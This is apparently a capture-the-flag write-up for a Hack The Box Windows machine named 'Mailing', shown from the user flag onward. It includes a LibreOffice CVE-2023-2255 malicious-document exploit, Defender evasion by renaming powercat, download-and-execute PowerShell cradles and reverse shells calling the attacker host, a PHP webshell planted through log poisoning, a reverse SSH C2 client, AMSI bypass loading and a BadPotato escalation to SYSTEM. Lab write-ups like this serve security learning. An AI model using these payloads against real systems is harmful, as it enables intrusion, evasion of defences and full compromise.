└─$ evil-winrm -i $(pt get rhost) -u 'maya' -p 'm4y4ngs4ri'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\maya\Documents> cat ..\Desktop\user.txt
4b080392a8ce49e061ff3bee026045ea
```

# Root Flag
---

## From maya to localadmin


### Enumeration

- Users and groups
	- `localadmin` is a none-default administrator

```bash
*Evil-WinRM* PS C:\Users\maya\Documents> Get-LocalGroup | foreach {$groupName = $_.name;Get-LocalGroupMember $groupName | select *, @{n="GroupName";e={$groupName}}} | sort GroupName, SID | ft -group GroupName SID, Name, ObjectClass


   GroupName: Administradores

SID                                           Name                  ObjectClass
---                                           ----                  -----------
S-1-5-21-3356585197-584674788-3201212231-1001 MAILING\localadmin    User
S-1-5-21-3356585197-584674788-3201212231-500  MAILING\Administrador User


   GroupName: Invitados

SID                                          Name             ObjectClass
---                                          ----             -----------
S-1-5-21-3356585197-584674788-3201212231-501 MAILING\Invitado User


   GroupName: Remote Management Users

SID                                           Name         ObjectClass
---                                           ----         -----------
S-1-5-21-3356585197-584674788-3201212231-1002 MAILING\maya User


   GroupName: System Managed Accounts Group

SID                                          Name                   ObjectClass
---                                          ----                   -----------
S-1-5-21-3356585197-584674788-3201212231-503 MAILING\DefaultAccount User


   GroupName: Usuarios

SID                                           Name                                 ObjectClass
---                                           ----                                 -----------
S-1-5-11                                      NT AUTHORITY\Usuarios autentificados Group
S-1-5-21-3356585197-584674788-3201212231-1002 MAILING\maya                         User
S-1-5-4                                       NT AUTHORITY\INTERACTIVE             Group


   GroupName: Usuarios de escritorio remoto

SID                                           Name         ObjectClass
---                                           ----         -----------
S-1-5-21-3356585197-584674788-3201212231-1002 MAILING\maya User
```

- User sessions
	- No other user sessions on the machine

```bash
*Evil-WinRM* PS C:\Users\maya\Documents> query user
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 maya                  console             1  Active      none   2024-05-05 10:09 PM
```

However, while monitoring file system changes, I found out `localadmin` was executing powershell script constantly

```bash
PS C:\Users\maya\Documents> $watcher = New-Object System.IO.FileSystemWatcher; $watcher.Path = 'C:\'; $watcher.IncludeSubdirectories = $true; $watcher.EnableRaisingEvents = $true; $action = {$path = $event.SourceEventArgs.FullPath; $changetype = $event.SourceEventArgs.ChangeType; Write-Host "$(get-date) | $changetype | $path"}
PS C:\Users\maya\Documents> Register-ObjectEvent $watcher 'Changed' -Action $action

Id     Name            PSJobTypeName   State         HasMoreData     Location             Command
--     ----            -------------   -----         -----------     --------             -------
1      337172e5-cbd...                 NotStarted    False                                $path = $event.SourceE...
```

![](/assets/obsidian/8872474b8442c213b92beea6ed3de9d1.png)

- By looking at `C:\`, found a folder `C:\Important Documents` owned by `localadmin` is interesting

```bash
*Evil-WinRM* PS C:\Users\maya\Documents> (ls \ -Force) 2>$null | select Mode,@{N='Owner'; E={$_.GetAccessControl().Owner}},LastWriteTime,Length,FullName | sort LastWriteTime | ft -wrap

Mode   Owner                       LastWriteTime         Length     FullName
----   -----                       -------------         ------     --------
d-----                             12/7/2019 10:14:52 AM            C:\PerfLogs
d--hsl NT AUTHORITY\SYSTEM         2/27/2024 4:26:08 PM             C:\Documents and Settings
d--hsl NT AUTHORITY\SYSTEM         2/27/2024 4:26:08 PM             C:\Archivos de programa
d--hs- NT AUTHORITY\SYSTEM         2/28/2024 7:34:06 PM             C:\$Recycle.Bin
d----- NT AUTHORITY\SYSTEM         2/28/2024 8:49:55 PM             C:\inetpub
d-r--- NT AUTHORITY\SYSTEM         3/3/2024 4:19:42 PM              C:\Users
d----- MAILING\localadmin          3/9/2024 1:47:27 PM              C:\PHP
d-r--- NT SERVICE\TrustedInstaller 3/13/2024 4:49:28 PM             C:\Program Files
d--hs-                             3/13/2024 8:06:23 PM             C:\System Volume Information
d-r--- NT SERVICE\TrustedInstaller 3/14/2024 3:24:05 PM             C:\Program Files (x86)
d--hs- BUILTIN\Administradores     4/11/2024 9:54:00 AM             C:\Recovery
d-----                             4/12/2024 5:54:05 AM             C:\wwwroot
d----- NT SERVICE\TrustedInstaller 4/29/2024 6:58:28 PM             C:\Windows
-a-hs-                             5/5/2024 10:09:11 PM  1006632960 C:\pagefile.sys
-a-hs-                             5/5/2024 10:09:11 PM  8192       C:\DumpStack.log.tmp
-a-hs-                             5/5/2024 10:09:11 PM  16777216   C:\swapfile.sys
d--h-- BUILTIN\Administradores     5/5/2024 10:18:47 PM             C:\$WinREAgent
d--h-- NT AUTHORITY\SYSTEM         5/6/2024 4:11:05 AM              C:\ProgramData
d----- MAILING\localadmin          5/6/2024 4:39:57 AM              C:\Important Documents
```

- Installed software under `HKLM` (System wide)
	- `LibreOffice 7.4.0.1`

```bash
PS C:\Users\maya\Documents> Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*, HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | ?{$_.Publisher -ne "Microsoft
 Corporation"} | Select-Object InstallDate, DisplayName, DisplayVersion, Publisher, InstallLocation | sort InstallDate | ft -wrap

InstallDate DisplayName                                  DisplayVersion  Publisher                     InstallLocation
----------- -----------                                  --------------  ---------                     ---------------



            Microsoft Edge Update                        1.3.185.29
20240227    OpenSSL 1.1.1k Light (64-bit)                                OpenSSL Win64 Installer Team  C:\Program Files\OpenSSL-Win64\
20240227    VMware Tools                                 12.1.0.20219665 VMware, Inc.                  C:\Program Files\VMware\VMware Tools\
20240227    hMailServer 5.6.8-B2574                                                                    C:\Program Files (x86)\hMailServer\
20240303    Git                                          2.44.0          The Git Development Community C:\Program Files\Git\
20240304    LibreOffice 7.4.0.1                          7.4.0.1         The Document Foundation       C:\Program Files\LibreOffice\
20240309    PHP Manager for IIS                          1.5.0
20240408    Python 3.12.2 Development Libraries (64-bit) 3.12.2150.0     Python Software Foundation
20240408    Python 3.12.2 pip Bootstrap (64-bit)         3.12.2150.0     Python Software Foundation
20240408    Python 3.12.2 Standard Library (64-bit)      3.12.2150.0     Python Software Foundation
20240408    Python Launcher                              3.12.2150.0     Python Software Foundation
20240408    Python 3.12.2 Executables (64-bit)           3.12.2150.0     Python Software Foundation
20240408    Python 3.12.2 Core Interpreter (64-bit)      3.12.2150.0     Python Software Foundation
```

### Client side attack - LibreOffice 7.4.0.1 : RCE

`Maya` can write `C:\Important Documents`

```bash
PS C:\Users\maya\Documents> icacls 'C:\Important Documents'
C:\Important Documents MAILING\maya:(OI)(CI)(M)
                       BUILTIN\Administradores:(I)(OI)(CI)(F)
                       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                       BUILTIN\Usuarios:(I)(OI)(CI)(RX)
                       NT AUTHORITY\Usuarios autentificados:(I)(M)
                       NT AUTHORITY\Usuarios autentificados:(I)(OI)(CI)(IO)(M)

Successfully processed 1 files; Failed processing 0 files
```

Let's assume someone will open documents in `C:\Important Documents` with **LibreOffice**

- Google : `libre office exploit`

> POC - https://github.com/elweth-sec/CVE-2023-2255

```bash
git clone https://github.com/elweth-sec/CVE-2023-2255
cd CVE-2023-2255
```

First, I will have perform 3 steps to bypass windows defender with `powercat`
1. Rename `powercat.ps1` to something else
2. Change function name from `powercat` to something else
3. Remove document, comment and help strings from the script

```bash
┌──(bravosec㉿fsociety)-[~/www]
└─$ cp powercat.ps1 rev.ps1

┌──(bravosec㉿fsociety)-[~/www]
└─$ sed -i 's/powercat/blabla/g' rev.ps1

┌──(bravosec㉿fsociety)-[~/www]
└─$ echo 'blabla -c 10.10.14.8 -p 1111 -ep' >> rev.ps1
```

- Command to load the script : `iex (New-Object Net.WebClient).DownloadString('http://10.10.14.8/rev.ps1')`

Convert to base64 command

```bash
┌──(bravosec㉿fsociety)-[~/htb/Mailing/exploit/CVE-2023-2255]
└─$ python ~/scripts/windows/powershell_base64.py <(echo "iex (New-Object Net.WebClient).DownloadString('http://10.10.14.8/rev.ps1')")
powershell -ep bypass -nop -e aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AOAAvAHIAZQB2AC4AcABzADEAJwApAAoA
```

Use the payload to create malicious `odt` document with the POC

```bash
┌──(bravosec㉿fsociety)-[~/htb/Mailing/exploit/CVE-2023-2255]
└─$ python CVE-2023-2255.py --cmd 'cmd /c powershell -ep bypass -e aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AOAAvAHIAZQB2AC4AcABzADEAJwApAAoA' --output poc.odt
File poc.odt has been created !

┌──(bravosec㉿fsociety)-[~/htb/Mailing/exploit/CVE-2023-2255]
└─$ cp poc.odt ~/www
```

Start reverse shell listener

```bash
┌──(bravosec㉿fsociety)-[~/htb/Mailing]
└─$ rlwrap -cAr nc -lvnp 1111
listening on [any] 1111 ...
```

Download `poc.odt` to `C:\Important Documents\` on target machine

```bash
PS C:\Users\maya\Documents> wget http://10.10.14.8/poc.odt -O "C:\Important Documents\top_secret.odt"
```

Got a shell as `localadmin`

```bash
connect to [10.10.14.8] from (UNKNOWN) [10.129.12.145] 53721
Windows PowerShell
Copyright (C) 2013 Microsoft Corporation. All rights reserved.

PS C:\Program Files\LibreOffice\program> whoami
mailing\localadmin
PS C:\Program Files\LibreOffice\program> cat $env:userprofile\Desktop\root.txt
c28a647a62630d0b363aab14b6ba227b
```

# Additional
---

## Shell as iis apppool

### 80 - LFI : Log poisoning with hmailserver's logs

- Google : `hmailserver logs location`

> https://www.hmailserver.com/forum/viewtopic.php?t=20469

![](/assets/obsidian/7e21b0ef1e8165fc79dd217373a4e01c.png)

I need the exact name format of the log files, since I'm too lazy to setup a lab for **hmailserver**, I will try to find samples from the internet

- Google : `C:\Program Files\hMailserver\logs\`

> https://hmailserver.com/forum/viewtopic.php?t=35315

Found 4 file paths

![](/assets/obsidian/78e16279b90ef7bd4fcf8a947f6796fe.png)

The main event log file will log `HELO` header, where special characters were not restricted

```bash
http 'http://mailing/download.php?file=../../../../../../../../../../../Program Files (x86)/hMailServer/Logs/hmailserver_2024-05-05.log'
```

![](/assets/obsidian/c60c207569db06be8c0b7431cc1b4710.png)

Inject `phpinfo()` in the log then include it with LFI

```bash
┌──(bravosec㉿fsociety)-[~/htb/Mailing]
└─$ rlwrap telnet $(pt get rhost) 25
Trying 10.129.57.172...
Connected to mailing.htb.
Escape character is '^]'.
220 mailing.htb ESMTP
HELO <?php phpinfo(); ?>
250 Hello.
```

```bash
http 'http://mailing/download.php?file=../../../../../../../../../../../Program Files (x86)/hMailServer/Logs/hmailserver_2024-05-05.log'
```

It was successful and there's no `disabled functions`

![](/assets/obsidian/bebc1a3a3d0ddd426d238025102ee62a.png)

Write and include a simple webshell

```bash
┌──(bravosec㉿fsociety)-[~/htb/Mailing]
└─$ rlwrap telnet $(pt get rhost) 25
Trying 10.129.57.172...
Connected to mailing.htb.
Escape character is '^]'.
220 mailing.htb ESMTP
HELO <?php system($_REQUEST[0]); ?>
250 Hello.
```

```bash
http 'http://mailing/download.php?file=../../../../../../../../../../../Program Files (x86)/hMailServer/Logs/hmailserver_2024-05-05.log&0=whoami'
```

![](/assets/obsidian/14788c9620444cedba36b9752f94b471.png)

Download a php reverse shell on target machine (from [ivan-sincek](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php))

```bash
┌──(bravosec㉿fsociety)-[~/htb/Mailing]
└─$ mkdir -p smb && cd smb && smbserver.py -smb2support s .

┌──(bravosec㉿fsociety)-[~/htb/Mailing/smb]
└─$ cp ~/www/rev.php .
```

```bash
http 'http://mailing/download.php?file=../../../../../../../../../../../Program Files (x86)/hMailServer/Logs/hmailserver_2024-05-05.log&0=copy \\10.10.14.71\s\rev.php .\rev.php'
```

Trigger reverse shell

```bash
┌──(bravosec㉿fsociety)-[~/htb/Mailing]
└─$ curl http://mailing.htb/rev.php
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Mailing]
└─$ rlwrap -cAr nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.71] from (UNKNOWN) [10.129.57.172] 62297
SOCKET: Shell has connected! PID: 852
Microsoft Windows [Versin 10.0.19045.4355]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\wwwroot>whoami
iis apppool\defaultapppool
```

### Reverse SSH - Interactive shell

> https://github.com/NHAS/reverse_ssh

Start server

```bash
┌──(bravosec㉿fsociety)-[~/htb/Mailing]
└─$ cd /opt/sectools/c2/reverse_ssh/bin && ./server 0.0.0.0:443
2024/05/05 15:35:16 Loading files from /opt/sectools/c2/reverse_ssh/bin
2024/05/05 15:35:16 Version:  v2.4.3
2024/05/05 15:35:16 Listening on 0.0.0.0:443
```

Build the client

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/c2/reverse_ssh]
└─$ RSSH_HOMESERVER=10.10.14.71:443 make
```

Download and start the client

```bash
PS C:\wwwroot> (new-object System.Net.WebClient).DownloadFile('http://10.10.14.71/client.exe', '\programdata\client.exe'); \programdata\client.exe
```

Connect to the client, now I have **ssh**'s functionalities

```bash
┌──(bravosec㉿fsociety)-[~/htb/Mailing]
└─$ ssh 127.0.0.1 -p 443 ls -t
Warning: Permanently added '[127.0.0.1]:443' (ED25519) to the list of known hosts.
                            Targets
+------------------------------------------+--------------------------+
| IDs                                      | Version                  |
+------------------------------------------+--------------------------+
| 7b9749c660a1a220a9561d8f4d56d7ac9841fb51 | SSH-v2.4.3-windows_amd64 |
| 8dded27b1dde25fe515af9980deb8a55ca2f01cd |                          |
| iis.apppool.defaultapppool.mailing       |                          |
| 10.129.57.172:62277                      |                          |
+------------------------------------------+--------------------------+
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Mailing]
└─$ ssh -J 127.0.0.1:443 iis.apppool.defaultapppool.mailing
Warning: Permanently added '[127.0.0.1]:443' (ED25519) to the list of known hosts.
Warning: Permanently added 'iis.apppool.defaultapppool.mailing' (ED25519) to the list of known hosts.
Windows PowerShell
Copyright (C) Microsoft Corporation. Todos los derechos reservados.

Prueba la nueva tecnología PowerShell multiplataforma https://aka.ms/pscore6

PS C:\wwwroot>
```

### Obtain full remote session

I don't have full permission 

```bash
PS C:\Users\maya\Documents> tasklist /v
ERROR: Access denied
```

> **Logon type 9:  NewCredentials. A caller cloned its current token and specified new credentials for outbound connections. The new logon session has the same local identity, but uses different credentials for other network connections.**

## From iis apppool to nt authority system

### Abuse privilege tokens - SeAssignPrimaryTokenPrivilege

- We have `SeAssignPrimaryTokenPrivilege`, which means we can perform **potato attacks**

```bash
PS C:\wwwroot> whoami /all

INFORMACIÓN DE USUARIO
----------------------

Nombre de usuario          SID
========================== =============================================================
iis apppool\defaultapppool S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415


INFORMACIÓN DE GRUPO
--------------------

Nombre de grupo                             Tipo               SID          Atributos
=========================================== ================== ============ ========================================================================
Etiqueta obligatoria\Nivel obligatorio alto Etiqueta           S-1-16-12288
Todos                                       Grupo conocido     S-1-1-0      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN\Usuarios                            Alias              S-1-5-32-545 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\SERVICIO                       Grupo conocido     S-1-5-6      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
INICIO DE SESIÓN EN LA CONSOLA              Grupo conocido     S-1-2-1      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Usuarios autentificados        Grupo conocido     S-1-5-11     Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Esta compañía                  Grupo conocido     S-1-5-15     Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN\IIS_IUSRS                           Alias              S-1-5-32-568 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
LOCAL                                       Grupo conocido     S-1-2-0      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
                                            Tipo SID no válido S-1-5-82-0   Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado


INFORMACIÓN DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripción                                       Estado
============================= ================================================= =============
SeAssignPrimaryTokenPrivilege Reemplazar un símbolo (token) de nivel de proceso Deshabilitado
SeIncreaseQuotaPrivilege      Ajustar las cuotas de la memoria para un proceso  Deshabilitado
SeAuditPrivilege              Generar auditorías de seguridad                   Deshabilitado
SeChangeNotifyPrivilege       Omitir comprobación de recorrido                  Habilitada
SeUndockPrivilege             Quitar equipo de la estación de acoplamiento      Deshabilitado
SeImpersonatePrivilege        Suplantar a un cliente tras la autenticación      Habilitada
SeCreateGlobalPrivilege       Crear objetos globales                            Habilitada
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso      Deshabilitado
SeTimeZonePrivilege           Cambiar la zona horaria                           Deshabilitado

PS C:\wwwroot>
```

Since the target machine have windows defender enabled, we will need to bypass AMSI first

```bash
PS C:\wwwroot> iex (new-object net.webclient).DownloadString('http://10.10.14.71/PowerSharpBinaries/Invoke-BadPotato.ps1')
iex : En línea: 1 Carácter: 1
+ function Invoke-BadPotato
+ ~~~~~~~~~~~~~~~~~~~~~~~~~
Este script contiene elementos malintencionados y ha sido bloqueado por el software antivirus.
En línea: 1 Carácter: 1
+ iex (new-object net.webclient).DownloadString('http://10.10.14.71/Pow ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
```

- Bypass AMSI at both **powershell** and **.NET** level (**Obfuscated payload was removed from writeup for de-identification**, google if you don't know what this part is about)

```bash
PS C:\wwwroot> iex (new-object net.webclient).DownloadString('http://10.10.14.71/amsi_ps.txt')
PS C:\wwwroot> iex (new-object net.webclient).DownloadString('http://10.10.14.71/amsi_net.txt')
True
```

Invoke `BadPotato` to start reverse ssh client

```bash
PS C:\wwwroot> iex (new-object net.webclient).DownloadString('http://10.10.14.71/PowerSharpBinaries/Invoke-BadPotato.ps1')
PS C:\wwwroot> Invoke-BadPotato -Command '\programdata\client.exe'
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Mailing]
└─$ ssh 127.0.0.1 -p 443 ls -t
Warning: Permanently added '[127.0.0.1]:443' (ED25519) to the list of known hosts.
                            Targets
+------------------------------------------+--------------------------+
| IDs                                      | Version                  |
+------------------------------------------+--------------------------+
| 0b2e22254331115349c22789937d2aec57e5bb47 | SSH-v2.4.3-windows_amd64 |
| 8dded27b1dde25fe515af9980deb8a55ca2f01cd |                          |
| iis.apppool.defaultapppool.mailing       |                          |
| 10.129.57.172:62303                      |                          |
+------------------------------------------+--------------------------+
| 34f01b252e1e52b10d44dab870d19b6dcf0ae6b0 | SSH-v2.4.3-windows_amd64 |
| 8dded27b1dde25fe515af9980deb8a55ca2f01cd |                          |
| nt.authority.system.mailing              |                          |
| 10.129.57.172:54488                      |                          |
+------------------------------------------+--------------------------+
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Mailing]
└─$ ssh -J 127.0.0.1:443 nt.authority.system.mailing
Warning: Permanently added '[127.0.0.1]:443' (ED25519) to the list of known hosts.
Warning: Permanently added 'nt.authority.system.mailing' (ED25519) to the list of known hosts.
Windows PowerShell
Copyright (C) Microsoft Corporation. Todos los derechos reservados.

Prueba la nueva tecnología PowerShell multiplataforma https://aka.ms/pscore6

PS C:\wwwroot> whoami
nt authority\system
PS C:\wwwroot> cat C:\Users\*\Desktop\*.txt
86800a47b59400e1f1ba5222049ebeaa
27617960bf754fdf7c7bb4cc051cb68f
```